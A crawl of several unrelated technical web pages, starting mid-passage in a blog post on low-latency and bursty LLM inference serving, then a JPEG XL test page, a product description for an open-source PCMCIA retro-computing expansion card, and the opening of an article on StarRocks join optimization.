exchanged for linear computation in exchange for storing a linear quantity of model activations, the "key-value cache" (originally and more descriptively known as the "past cache").&lt;/p&gt;&lt;p&gt;The solution is to route requests to LLM inference replicas based on the information used to populate the cache. For lossless cacheing, that means the prefix(es) of the request. This "prefix-aware" routing can look as simple as sticky sessions per conversation, which we provide native support for in Modal, or can involve deeper inspection of both request and cache contents.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Wrangling the memory bound&lt;/head&gt;&lt;p&gt;The bottlenecking operations in LLM inference with KV caching have a low arithmetic intensity, which means inference is bound by memory.&lt;/p&gt;&lt;p&gt;Intuitively, you can generate only one or a few tokens per forward pass per request, but you must load all the model weights (typically numbered in the billions) into registers. Per user, those weights get used for roughly one add and one multiply, but ridge point arithmetic intensities for GPUs are in the hundreds or thousands of operations per byte â and so, much arithmetic bandwidth will go to waste. Furthermore, even if the latency requirements and request load for the online service admit batching across requests, prefixes are generally mostly distinct per request for these workloads, and so distinct elements of the KV cache must be loaded per request. Cache contents start out negligible relative to model weights but grow with sequence length.&lt;/p&gt;&lt;p&gt;The foregoing arguments focus on throughput, but in online workloads, where latency is the primary concern, the situation is even worse. Because running a forward pass on a batch requires loading billions of model weights and memory bandwidths are measured in trillions of bytes per second, forward passes on single accelerators necessarily take milliseconds. Individual users cannot see lower per-token latencies than this. Autoregressive, i.e. sequential, generation stacks these latencies, rapidly eating into the latency budget, even for short generated sequences (another instance of Amdahl's heartbreaking law).&lt;/p&gt;&lt;p&gt;One resolution is to increase the memory bandwidth in the system (specifically, the memory bandwidth between model weights + KV cache and arithmetic units). On the hardware side, that means using the latest GPUs, like H100s and B200s, which offer substantial improvements in memory bandwidth over past generations.&lt;/p&gt;&lt;p&gt;Using multiple GPUs increases aggregate bandwidth. But just adding more GPUs isn't enough to cut latency. On the software side, systems must additionally take advantage of intra-task parallelism to split bandwidth demands across accelerators. The most common approach is tensor parallelism, which takes advantage of the inherent parallelism of matrix multiplications to split pieces of the multiplication onto different workers.&lt;/p&gt;Tensor parallelism splits a single matrix multiplication (left-hand-side of equation) across GPUs (represented by color; shared data on all GPUs in gray).&lt;p&gt;This requires low latency and high bandwidth, so it is usually done only within the backend/"scale-up" network, typically NVLink for GPUs. For many useful open source models applied to specific tasks, the standard eight-accelerator NVLink domain provides sufficient memory bandwidth to hit interactive latency targets, but we anticipate a future where the larger, rack-scale NVLink domains offered by NVSwitch are required.&lt;/p&gt;&lt;p&gt;In addition to increasing memory bandwidth, systems can also decrease memory requirements, typically at a cost to model quality. Whether this trade-off is sensible is application-dependent â another good reason to host your own inference!&lt;/p&gt;&lt;p&gt;The first lever to pull is floating point quantization. Generally, the performance benefit is greater if the hardware supports native floating point operations on the quantized data type: eight bit (FP8) for Hopper GPUs, four bit (FP4) for Blackwell GPUs.&lt;/p&gt;&lt;p&gt;For models above about seventy billion parameters, four bit quantization works well with minimal fuss. For smaller models, down to a billion parameters, only eight bit quantization retains sufficient model quality â with the notable exception of gpt-oss 20B.&lt;/p&gt;&lt;p&gt;Finally, we note in passing that the reason for the mixture-of-experts (MoE) structure for feedforward layers in contemporary architectures is to reduce the demand on memory bandwidth. If you're comparing across models to determine memory requirements and serving cost, look at active parameters, not just total parameters!&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Cheating the speed of light&lt;/head&gt;&lt;p&gt;Eventually, the memory bound is inescapable, and latency cannot be reduced any further. The system has reached the metaphorical "speed of light" for the hardware.&lt;/p&gt;&lt;p&gt;The speed of light cannot be broken, but it can be cheated.&lt;/p&gt;&lt;p&gt;The key technique for memory-bound inference is speculative decoding, which takes advantage of some of the slack in arithmetic bandwidth in naÃ¯ve, single-token autoregressive inference.&lt;/p&gt;&lt;p&gt;Specifically, we use a simpler language modeling system, the speculator, to provide multiple sequential output tokens for the larger, target system to judge in parallel. Because inference is memory-bound, there are extra FLOPs to be had for running the speculator. Because the larger model already outputs probabilities for each token in its input, engines can straightforwardly ensure that outputs are unchanged (cf. "rejection sampling" from statistical inference).&lt;/p&gt;In speculative decoding, a speculator model produces "draft" tokens (light green) that are validated in parallel by the target model. Those with sufficiently high probability under the target model are accepted (dark green, lower right) and the first token that is rejected is replaced with a generation from the target model (orange).&lt;p&gt;This idea is well-worn by LLM inference standards, but until relatively recently, using more sophisticated draft models was hamstrung by operational difficulties that offset the limited performance gains. That left only very simple speculators, like "predict that the same subsequence will be repeated" (aka n-gram speculation), which generally have lower rates of acceptance and so speed up inference less.&lt;/p&gt;&lt;p&gt;The EAGLE-3 speculator training method changed that for us. Not only does it produce simple speculators with good support in open source engines, but it also achieves very high quality, measured in acceptance lengths. We have found that just adding EAGLE-3 via open source inference engines is sufficient to match the performance achieved by model providers with proprietary inference stacks. At time of writing, SGLang has better support for speculative decoding, another reason we recommend it for low latency applications.&lt;/p&gt;&lt;head rend="h3"&gt;Implementation&lt;/head&gt;&lt;p&gt;We make the following choices to optimize for low latency in online applications:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;run on SGLang to reduce host overhead and take full advantage of speculative decoding&lt;/item&gt;&lt;item&gt;use FP8 for smaller memory footprint and fast prefill and decode kernels on H100/H200 GPUs&lt;/item&gt;&lt;item&gt;apply extra tensor parallelism above any required by memory capacity in order to reduce memory read latency&lt;/item&gt;&lt;item&gt;use an off-the-shelf or custom-trained EAGLE-3 speculator model&lt;/item&gt;&lt;item&gt;on Modal, use the &lt;code&gt;modal.experimental.http_server&lt;/code&gt;deployment decorator to create a regionalized, ultra-low-overhead web server with session-based routing&lt;/item&gt;&lt;/list&gt;&lt;p&gt;You can see this in action in a code sample here.&lt;/p&gt;&lt;head rend="h3"&gt;Future considerations&lt;/head&gt;&lt;p&gt;Because of the tremendous investment in and excitement over chatbots, this workload has received substantial engineering work already and its future is slightly easier to chart.&lt;/p&gt;&lt;p&gt;First, we expect more ways to "cheat the speed of light" to become important in the near future, in particular lossy optimizations that sacrifice some performance for a lot of speed. A few we didn't mention above, but which are the targets of current research: approximate KV cacheing, layer skipping, pruning, lossy compression of the KV cache, lossy speculation. Many of these techniques are already reasonably mature in the world of diffusion models, where other opportunities for speedups are limited (see our blog post on accelerating Flux).&lt;/p&gt;&lt;p&gt;Note that because these optimizations are "lossy", they change the hosted model, in the statistical sense. Behavior is guaranteed to change, if only slightly. That makes for a good economic reason to self-host: you can check which optimizations work for your workload.&lt;/p&gt;For some workloads, fully lossless performance improvements like speculative decoding might be insufficient to achieve target latency (vertical arrow). The right lossy performance improvements (angled arrows) to achieve the target speed and latency (colored regions) differ between workloads (indicated by color).&lt;p&gt;In part due to the investments of existing hardware providers and the crop of inference hardware startups, we expect these workloads to move increasingly onto more exotic hardware that even less resembles a typical workstation or generic high-performance machine in the cloud.&lt;/p&gt;&lt;p&gt;Nvidia is investing heavily in tightly-interconnected systems, e.g. "rack-scale" NVL72/CPX Rubin. This architecture can achieve massive memory bandwidth at low latency without using components that are too exotic relative to existing systems (for instance, using HBM for system memory). Following the same logic, Google is building large TPU systems with a similar architecture. Doing better requires deeper innovation at the silicon layer, likely in the form of application-specific integrated circuits for specific model architectures. To reach one billion tokens per second, for instance, would require tightly co-locating storage and compute, e.g. with analog elements.&lt;/p&gt;&lt;p&gt;While we don't expect these systems to go without demand, we expect the relative importance of online/chat workloads to decrease over time. The current interest has been driven by the initial "killer app" for LLMs, OpenAI's ChatGPT. This has led to lots of imitation and herding behavior by capital providers, investors, founders, and even application developers.&lt;/p&gt;&lt;p&gt;But we are already seeing the signs of a different "killer app" emerging â long-running background agents, like Claude Code, which have the patience of machines, rather than humans. These applications generate quite different workloads, to which we turn in the next section.&lt;/p&gt;&lt;head rend="h2"&gt;Semi-online workloads demand flexibility&lt;/head&gt;&lt;quote&gt;&lt;p&gt;Roughly speaking, the cost of a system scales with its (short-term) peak traffic, but for most applications the value the system generates scales with the (long-term) average traffic. The gap between "paying for peak" and "earning on average" is critical to understand how the economics of large-scale cloud systems differ from traditional single-tenant systems.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Users of Reducto's document processing platform sometimes upload a single form for immediate perusal and sometimes drop their business's entire document storage.&lt;/p&gt;&lt;p&gt;An AI news analytics agency needs to scale up its news agents in minutes in response to breaking news, crawling a variety of sources to produce syntheses. It also needs to produce a "daily newspaper" on a longer cadence.&lt;/p&gt;&lt;p&gt;These systems are semi-online: sometimes they must return to a waiting human; other times they pass their results on to another computer system in a pipeline (which might be another agent). Even when they directly serve human users, they are not as tightly interactive. Their workloads are bursty â sometimes load goes to hundreds of times baseline for minutes or tens of minutes.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Taming peak-to-average load ratio&lt;/head&gt;&lt;p&gt;This high peak-to-average ratio creates a cost conundrum for systems serving these workloads, as alluded to by Marc Brooker of Amazon Web Services in the quote above. That is, costs are typically driven by requirements to service peak demand, but revenues are driven by servicing average demand.&lt;/p&gt;System costs are proportional to the allocated resources for peak demand (shaded area). Revenues are proportional to the realized demand for resources (area under the curve). When peak demand is much higher than average, systems without flexible resource allocations, as depicted in this figure, become uneconomical.&lt;p&gt;The solution we've taken at Modal is the same taken by AWS: aggregation and multitenancy. That is, we service a variety of these workloads on shared hardware, whose uncorrelated peaks aggregate into a smooth timeline of demand for that hardware. The peak-to-average load ratio is diminished.&lt;/p&gt;In a multi-tenant system (left, tenant resource demand indicated by colored lines), peak demand is reduced, cutting costs (shaded region). A group of single-tenant systems has, in the worst case scenario (right) cost per workload (each shaded region) close to the cost of the entire multi-tenant system.&lt;p&gt;We can then maintain a buffer sufficient to service resource requests immediately and acquire or release resources as the average changes. See this blog post for details on that system.&lt;/p&gt;&lt;head rend="h3"&gt;Challenge: Cutting cold starts from minutes to seconds&lt;/head&gt;&lt;p&gt;Multi-tenant computer systems have their drawbacks, including the addition of cold start latency. That is, even if the request for serving resources is serviced out of a buffer, configuring those resources to start handling the request takes some time: containers or VMs must boot, then inference engines must start.&lt;/p&gt;&lt;p&gt;Without optimization, container startup time can run into several minutes for large container images.&lt;/p&gt;&lt;p&gt;At Modal, we've invested heavily in techniques to accelerate container startup time, like mixing eager pre-fetching of files that will be used and lazy-loading of files that are unlikely to be used.&lt;/p&gt;&lt;p&gt;After optimization, container startup can be reduced to seconds. But engine initialization can still take tens of seconds.&lt;/p&gt;&lt;p&gt;For instance, the Torch JIT compiler can deliver massive speedups to inference passes, but it can take several minutes to run â during which time the inference server replica cannot service requests.&lt;/p&gt;&lt;p&gt;Our solution is GPU memory snapshotting. Just before an inference server replica is ready to service requests, we dump the program state to the filesystem. When we spin up a new replica, it is loaded straight from the filesystem, skipping computations like Torch JIT compilation (and also converting a large number of small file I/Os into one large I/O, which is a better fit to storage systems).&lt;/p&gt;Memory snapshotting can cut down inference server start times by a factor of 10, requiring only that the server be&lt;code&gt;restore&lt;/code&gt;d from
      serialized snapshot storage (drum icon). Rapid scaleup improves response
      time under sudden bursts of load (yellow &lt;code&gt;/chat/completions&lt;/code&gt; requests). &lt;p&gt;We have benchmarked GPU snapshotting across a wide class of models and found that it can cut LLM inference server start times from minutes to seconds.&lt;/p&gt;&lt;head rend="h3"&gt;Implementation&lt;/head&gt;&lt;p&gt;We make the following choices to optimize for flexible scaling in semi-online applications:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Use fast-booting, autoscaling GPU resources to service variable load economically&lt;/item&gt;&lt;item&gt;While spot and on-demand B200s are still relatively scarce from hyperscalers, prefer H100s or H200s, which further indicates the use of FP8-quantized models&lt;/item&gt;&lt;item&gt;On Modal, use the &lt;code&gt;web_server&lt;/code&gt;deployment decorator to turn a Python program exposing an OpenAI-compatible server into a web service&lt;/item&gt;&lt;item&gt;Set auto-scaling policy to absorb small load bursts â on Modal, that's done by setting &lt;code&gt;max_inputs&lt;/code&gt;to be higher than&lt;code&gt;target_inputs&lt;/code&gt;in the&lt;code&gt;modal.concurrent&lt;/code&gt;decorator&lt;/item&gt;&lt;item&gt;The choice of engine, between vLLM and SGLang, depends on other factors like model availability.&lt;/item&gt;&lt;item&gt;Use GPU memory snapshotting to speed up server boots, especially if your engine requires slow JIT compilation steps. Almost all programs can be snapshot, but many programs require some slight code rewrites to be snapshot.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;You can find sample code for serving these workloads with SGLang here and with vLLM here.&lt;/p&gt;&lt;head rend="h3"&gt;Future considerations&lt;/head&gt;&lt;p&gt;We expect more of these semi-online applications to emerge as the field matures â offline/analytical and online/transaction workloads are the obvious things to do, but there are many more tasks in the interior, combining traits of both.&lt;/p&gt;&lt;p&gt;In particular, we expect the salience of these workloads to increase as more work is done by long-running agents, which have the patience of computer systems, rather than humans. That is, human users will pay a large premium to avoid a small wait â and productivity studies like Doherty &amp;amp; Thadhani's, quoted above, bear out that trade. But engineers architecting agents or systems of agents to complete long-running tasks will generally prefer the opposite trade. We look forward to servicing more of these workloads as builders and engineers discover and scale them.&lt;/p&gt;&lt;head rend="h2"&gt;What next?&lt;/head&gt;&lt;p&gt;We are still early in the era of LLM engineering, despite being several years into the era of LLMs, thanks to the head-start on capabilities achieved by proprietary model companies and proprietary inference engines.&lt;/p&gt;&lt;p&gt;But as in other domains, the underlying technologies are spreading enough to become commodities. The additional benefits of customization and control then tilt the balance increasingly in favor of building LLM inference in-house.&lt;/p&gt;&lt;p&gt;This requires additional engineering effort â and a community effort to distribute knowledge, to upskill, and to produce open models and open source software. At Modal, we're happy to contribute to all of these. If you're interested in deploying your own inference at scale, talk to us.&lt;/p&gt;&lt;/main&gt;

    &lt;head rend="h2"&gt;JPEG XL Test Page&lt;/head&gt;
    &lt;p&gt;This page shows a JPEG XL image, if your browser can handle it! At this point in time (January 2026) this more or less means only Safari will display the image, as far as I know. See also Can I Use.&lt;/p&gt;
    &lt;p&gt;The person in the image is Jon Sneyers, co-author of the JPEG XL spec and also creator of the “Free Lossless Image Format” that came before it.&lt;/p&gt;
    &lt;p&gt;I find JPEG XL interesting because of its history. It once was implemented in Chrome, but hidden behind a feature flag. Then Chrome said that it did not saw enough usage, which is unsurprising, really, and it was removed. Now they blessed it again and are re-adding it! Some of this story is found on the JPEG XL Wikipedia page&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;This is a PCMCIA development board for retro-computing enthusiasts who want to experiment with audio, networking, and expansion on vintage laptops and mobile devices. While ISA users have enjoyed projects like PicoGUS and PicoMEM, PCMCIA users have long been limited to scarce legacy cards with narrow functionality — this board aims to change that. The project is fully open source, and while it is designed to encourage low-level experimentation and development, pre-built, community-provided firmware is available for users who want to test functionality without diving into the technical details. It is intended for hobbyist and development use and is not certified for production deployment.&lt;/p&gt;
    &lt;head rend="h2"&gt;Device Compatibility&lt;/head&gt;
    &lt;p&gt;This is a Type II, 5V, 16-bit PC Card designed for use in compliant PCMCIA sockets and should work in most devices. While I have not yet encountered a device advertising PCMCIA support that was incompatible, support for every device cannot be guaranteed. Power consumption varies depending on enabled functions; support for low-power devices such as the HP 200LX is considered mandatory, and the card has been tested to remain within the 150 mA limit while using network functionality and storage emulation. On devices with very limited power budgets, simultaneous use of networking and audio may require external power.&lt;/p&gt;
    &lt;p&gt;A short list of devices that I actively test on:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;IBM PC110&lt;/item&gt;
      &lt;item&gt;HP 200LX&lt;/item&gt;
      &lt;item&gt;Amiga 1200&lt;/item&gt;
      &lt;item&gt;Apple Newton&lt;/item&gt;
      &lt;item&gt;HP Jornada 720&lt;/item&gt;
      &lt;item&gt;Compaq LTE Elite&lt;/item&gt;
      &lt;item&gt;IBM Thinkpad 235&lt;/item&gt;
      &lt;item&gt;IBM Thinkpad 240&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;Features Overview&lt;/head&gt;
    &lt;p&gt;Built around the RP2350 and leveraging the ISA-like nature of the PCMCIA bus, this project benefits greatly from code interchangeability with other RP-based retro projects, most notably PicoGUS and PicoMEM. This shared foundation allows features and improvements to move quickly between platforms, expanding functionality over time.&lt;/p&gt;
    &lt;head rend="h1"&gt;Wi-fi / Bluetooth&lt;/head&gt;
    &lt;p&gt;The card has an onboard wireless module containing the Infineon CYW43439, same as found on the Raspberry Pi Pico W. This allows the card to attach to modern Wi-Fi networks (2.4GHz 802.11b/g/n WPA2). It can then emulate an NE2000 adapter and/or a dialup modem allowing the host computer to access the network as if it was wired, unaware it is wireless.&lt;/p&gt;
    &lt;p&gt;Essentially every platform containing PCMCIA will have existing drivers to recognize and utilize the card as a modem or ethernet adapter making this a near universal option for all devices and platforms including rare devices such as the Apple Newton.&lt;/p&gt;
    &lt;p&gt;It also has a Bluetooth which opens up a lot of possibilities for A2DP wireless audio streaming and wireless gamepads/mice. Software for these features Bluetooth features are still under development and is at a proof of concept stage.&lt;/p&gt;
    &lt;head rend="h1"&gt;Audio&lt;/head&gt;
    &lt;head rend="h2"&gt;Hardware&lt;/head&gt;
    &lt;p&gt;The card has an included Texas Instruments TLV320AIC3254 which calls itself a “Very Low-Power Stereo Audio CODEC with programmable miniDSP”. The main features of this device in our application are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;DAC that is fed high quality audio from the RP2354 over i2s&lt;/item&gt;
      &lt;item&gt;Amplified stereo headphone amplifier&lt;/item&gt;
      &lt;item&gt;Line out feeding the host device internal speaker (where supported)&lt;/item&gt;
      &lt;item&gt;Line in from the onboard midi sythesizer (see below)&lt;/item&gt;
      &lt;item&gt;Line in from external i/o connector for mixing external audio&lt;/item&gt;
      &lt;item&gt;Controlled by the RP2350 via i2c (controlling volumes etc).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is combined with a DREAM SAM2695 “Low power single chip synthesizer with effects and built-in codec”, this is the same chip used on the Serdashop Dreamblaster S2. It is a great device for DOS gaming and other applications, its main features are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;64-voice polyphony (without effects)&lt;/item&gt;
      &lt;item&gt;38-voice polyphony + effects&lt;/item&gt;
      &lt;item&gt;CleanWave soundset&lt;/item&gt;
      &lt;item&gt;General MIDI compatible effects&lt;/item&gt;
      &lt;item&gt;4-band stereo equalizer&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;MPU-401&lt;/head&gt;
    &lt;p&gt;Emulation of intelligent mode MPU-401 is possible thanks to implementation done by PicoGUS base on SoftMPU/HardMPU. The midi output is driven to the internal SAM2695 as well as to an external Midi port. While using external Midi you are able to mute the internal SAM2695, or if you are not using any of the internal sound hardware you can power it down. Planning has been done with the external GPIO to support MIDI IN if ever implemented.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sound Blaster Emulation&lt;/head&gt;
    &lt;p&gt;Sound Blaster emulation on PCMCIA is particularly challenging, as most PCMCIA sockets and cards lack native DMA support. To address this, the PicoPCMCIA implements DMA emulation, similar in spirit to the approach used by the infamous IBM 3D Sound card, resulting in good compatibility with many real-mode and protected-mode games — including the obligatory Doom. The IBM card was essentially the only card to offer this functionality, it seems it may have been that way due to IBM patenting (expired) the concept of DMA emulation with PCMCIA.&lt;/p&gt;
    &lt;p&gt;The core Sound Blaster emulation developed for PicoPCMCIA has been shared with the PicoGUS project, where it is actively used and has greatly benefited from additional community-contributed improvements. Adlib/OPL emulation is borrowed from the PicoGUS implementation.&lt;/p&gt;
    &lt;head rend="h2"&gt;Gravis Ultrasound (GUS)&lt;/head&gt;
    &lt;p&gt;Thanks to the incredible work from the PicoGUS, it is now possible to have the worlds first PCMCIA Gravis Ultrasound! Currently this does not support DMA so only some games/demos work. The GUS is a little bit different with its use of TC, but it may be possible to apply the DMA emulation strategies from the SoundBlaster mode to the GUS.&lt;/p&gt;
    &lt;head rend="h2"&gt;CD-ROM Audio&lt;/head&gt;
    &lt;p&gt;The card implements an emulated Panasonic MKE CD-ROM which an be used for both data and audio. The audio at full quality is sent to the TI DSP over i2c and can be used simultaneously with all the other audio functions. This code was shared to the PicoGUS and is currently in use there and has been improved by the community.&lt;/p&gt;
    &lt;head rend="h1"&gt;Storage Emulation&lt;/head&gt;
    &lt;p&gt;While storage emulation is not a primary focus given the ready availability of solutions like CompactFlash, it is supported and continues to evolve. Current implementations include Panasonic MKE CD-ROM emulation as well as linear flash emulation, and ATA/ATAPI emulation should be possible in the future once the PicoIDE project becomes available and code can be shared. Disk images can be BIN/CUE, ISO and are stored on the MicroSD card.&lt;/p&gt;
    &lt;p&gt;There is also a special edge case for the HP 200LX, where the card can emulate an “Accurite Doubleslot” device, allowing an emulated flash card to coexist with networking or sound functionality. This is particularly important on systems with only a single PCMCIA slot, where storage availability is at a premium.&lt;/p&gt;
    &lt;head rend="h1"&gt;USB&lt;/head&gt;
    &lt;p&gt;The USB port for the RP2354 is made available on the external connector. It’s primary purpose is to be used for flashing the card with firmware, however as demonstrated on the PicoGUS and PicoMEM, it can use used for USB Gamdpads and USB Mice which are presented the the host system as legacy gamepad and serial mouse. It has also been demonstrated the latest update to the PicoGUS that accessing flash storage at a reasonable speed is possible via USB.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Inside StarRocks: Why Joins Are Faster Than You’d Expect&lt;/head&gt;
    &lt;quote&gt;✍🏼 About The Author:Seaven He, StarRocks Committer, Engineer at Celerdata&lt;/quote&gt;
    &lt;p&gt;StarRocks takes the opposite approach: keep data normalized and make joins fast enough to run on the fly. The challenge is the plan. In a distributed system, the join search space is huge, and a good plan can be orders of magnitude faster.&lt;/p&gt;
    &lt;p&gt;This deep dive explains how StarRocks’ cost-based optimizer makes that possible, in four parts: join fundamentals and optimization challenges, logical join optimizations, join reordering, and distributed join planning. Finally, we examine real-world case studies from NAVER, Demandbase, and Shopee to illustrate how efficient join execution delivers tangible business value.&lt;/p&gt;
    &lt;head rend="h2"&gt;Join Fundamentals and Optimization Challenges&lt;/head&gt;
    &lt;head rend="h3"&gt;1.1 Join Types&lt;/head&gt;
    &lt;p&gt;The diagram above illustrates several common join types:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Cross Join: Produces a Cartesian product between the left and right tables.&lt;/item&gt;
      &lt;item&gt;Full / Left / Right Outer Join: For rows that do not find a match, outer joins return results with &lt;code&gt;NULL&lt;/code&gt;values filled in according to the join semantics—on both tables (full), the left table (left), or the right table (right).&lt;/item&gt;
      &lt;item&gt;Anti Join: Returns rows that do not have a matching counterpart in the join relationship. Anti-joins typically appear in query plans for &lt;code&gt;NOT IN&lt;/code&gt;or&lt;code&gt;NOT EXISTS&lt;/code&gt;subqueries.&lt;/item&gt;
      &lt;item&gt;Semi Join: The opposite of an anti-join, it returns only rows that do have a match in the join relationship, without producing duplicate result rows from the matching side.&lt;/item&gt;
      &lt;item&gt;Inner Join: Returns the intersection of the left and right tables. Based on the join condition, it may generate one-to-many result rows.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;1.2 Challenges in Join Optimization&lt;/head&gt;
    &lt;p&gt;Join performance optimization generally falls into two areas:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;improving the efficiency of join operators on a single node, and&lt;/item&gt;
      &lt;item&gt;designing a reasonable join plan that minimizes input size and execution cost.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This article focuses on the second aspect. To set the stage, we begin by examining the key challenges in join optimization.&lt;/p&gt;
    &lt;p&gt;Challenge 1: Multiple Join Implementation Strategies&lt;/p&gt;
    &lt;p&gt;As shown above, different join algorithms perform very differently depending on the scenario. For example, Sort-Merge Join can be significantly more efficient than Hash Join when operating on already sorted data. However, in distributed databases where data is typically hash-partitioned, Hash Join often outperforms Sort-Merge Join by a wide margin. As a result, the database must choose the most appropriate join strategy based on the specific workload and data characteristics.&lt;/p&gt;
    &lt;p&gt;Challenge 2: Join Order Selection in Multi-Table Joins&lt;/p&gt;
    &lt;p&gt;In multi-table join scenarios, executing highly selective joins first can significantly improve overall query performance. However, determining the optimal join order is far from trivial.&lt;/p&gt;
    &lt;p&gt;As illustrated above, under a left-deep join tree model, the number of possible join orders for N tables is on the order of &lt;code&gt;2^n-1&lt;/code&gt;. Under a bushy join tree model, the number of possible combinations grows even more dramatically, reaching &lt;code&gt;2^(n-1) * C(n-1)&lt;/code&gt;. For a database optimizer, the time and cost required to search for the optimal join order therefore increases exponentially, making join ordering one of the most challenging problems in query optimization.&lt;/p&gt;
    &lt;p&gt;Challenge 3: Difficulty in Estimating Join Effectiveness&lt;/p&gt;
    &lt;p&gt;Before query execution, it is extremely difficult for the database to accurately predict the real execution behavior of a join. A common assumption is that joining a small table with a large table is more selective than joining two large tables, but this is not always true.&lt;/p&gt;
    &lt;p&gt;In practice, one-to-many relationships are common, and in more complex queries, joins are often combined with filters, aggregations, and other operators. After data flows through multiple transformations, the optimizer’s ability to accurately estimate join input sizes and selectivity degrades significantly.&lt;/p&gt;
    &lt;p&gt;Challenge 4: A Single-Node Optimal Plan Is Not Necessarily Optimal in Distributed Systems&lt;/p&gt;
    &lt;p&gt;In distributed systems, data often needs to be reshuffled or broadcast across nodes so that the required records can participate in join computation. Distributed joins are no exception.&lt;/p&gt;
    &lt;p&gt;This introduces a key complication: an execution plan that is optimal in a single-node database may perform poorly in a distributed environment because it ignores data distribution and network transfer costs.&lt;/p&gt;
    &lt;p&gt;Therefore, when planning join execution strategies in distributed databases, the optimizer must explicitly account for data placement and communication overhead in addition to local execution efficiency.&lt;/p&gt;
    &lt;head rend="h3"&gt;1.3 SQL Optimization Workflow&lt;/head&gt;
    &lt;p&gt;In StarRocks, SQL optimization is primarily handled by the query optimizer and is mainly concentrated in the Rewrite and Optimize phases.&lt;/p&gt;
    &lt;head rend="h3"&gt;1.4 Principles of Join Optimization&lt;/head&gt;
    &lt;p&gt;At present, StarRocks primarily uses Hash Join as its join algorithm. By default, the right-hand table is used to build the hash table. Based on this design choice, we summarize five key optimization principles:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Different join types have very different performance characteristics. Whenever possible, prefer higher-performance join types and avoid expensive ones. Based on the typical size of join outputs, the rough performance ranking is: Semi Join / Anti Join &amp;gt; Inner Join &amp;gt; Outer Join &amp;gt; Full Outer Join &amp;gt; Cross Join.&lt;/item&gt;
      &lt;item&gt;When using Hash Join, building the hash table on a smaller input is significantly more efficient than building it on a large table.&lt;/item&gt;
      &lt;item&gt;In multi-table joins, prioritize joins with high selectivity.&lt;/item&gt;
      &lt;item&gt;Minimize the amount of data participating in joins whenever possible.&lt;/item&gt;
      &lt;item&gt;Minimize network overhead introduced by distributed joins.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Join Logical Optimization&lt;/head&gt;
    &lt;p&gt;This section introduces a set of heuristic rules used by StarRocks to optimize joins at the logical level.&lt;/p&gt;
    &lt;head rend="h3"&gt;2.1 Type Transformations&lt;/head&gt;
    &lt;p&gt;The first group of optimizations directly follows the first join optimization principle discussed earlier: transform low-efficiency join types into more efficient ones whenever the semantics allow it.&lt;/p&gt;
    &lt;p&gt;StarRocks currently applies three major transformation rules.&lt;/p&gt;
    &lt;p&gt;Rule 1: Converting a Cross Join into an Inner Join&lt;/p&gt;
    &lt;p&gt;A Cross Join can be rewritten as an Inner Join when it satisfies the following condition:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There exists at least one predicate that expresses a join relationship between the two tables.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;-- Before transformation&lt;lb/&gt;SELECT * FROM t1, t2 WHERE t1.v1 = t2.v1&lt;lb/&gt;&lt;lb/&gt;-- After transformation&lt;lb/&gt;-- WHERE t1.v1 = t2.v1 is a join predicate&lt;lb/&gt;SELECT * FROM t1 INNER JOIN t2 ON t1.v1 = t2.v1;&lt;/code&gt;
    &lt;p&gt;Rule 2: Converting an Outer Join into an Inner Join&lt;/p&gt;
    &lt;p&gt;A Left / Right Outer Join can be rewritten as an Inner Join when the following conditions are met:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There exists a predicate referencing the nullable side of the outer join (Right table for a Left Outer Join, or Left table for a Right Outer Join).&lt;/item&gt;
      &lt;item&gt;The predicate is a strict (null-rejecting) predicate.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example:&lt;/p&gt;
    &lt;code&gt;-- Before transformation&lt;lb/&gt;SELECT * FROM t1 LEFT OUTER JOIN t2 ON t1.v1 = t2.v1 WHERE t2.v1 &amp;gt; 0;&lt;lb/&gt;&lt;lb/&gt;-- After transformation&lt;lb/&gt;-- t2.v1 &amp;gt; 0 is a strict predicate on t2&lt;lb/&gt;SELECT * FROM t1 INNER JOIN t2 ON t1.v1 = t2.v1 WHERE t2.v1 &amp;gt; 0;&lt;/code&gt;
    &lt;p&gt;⚠️ Important note: In an outer join, &lt;code&gt;ON&lt;/code&gt; clause predicates participate in null extension, not filtering. Therefore, this rule does not apply to join predicates inside the &lt;code&gt;ON&lt;/code&gt; clause:&lt;/p&gt;
    &lt;code&gt;SELECT * FROM t1 LEFT OUTER JOIN t2 ON t1.v1 = t2.v1 AND t2.v1 &amp;gt; 1;&lt;/code&gt;
    &lt;p&gt;This query is not semantically equivalent to:&lt;/p&gt;
    &lt;code&gt;SELECT * FROM t1 INNER JOIN t2 ON t1.v1 = t2.v1 AND t2.v1 &amp;gt; 1;&lt;/code&gt;
